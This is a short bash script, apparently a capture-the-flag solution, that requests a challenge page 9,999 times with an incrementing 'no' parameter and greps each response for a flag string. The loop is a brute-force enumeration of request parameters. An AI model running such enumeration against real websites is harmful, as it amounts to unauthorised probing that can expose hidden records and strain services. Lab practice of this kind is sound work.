#!/bin/bash

for i in {1..9999}
do
	curl -s https://web.ctf.rasyidmf.com/chal10/?no=$i | grep -oE CTFR{.*}
done

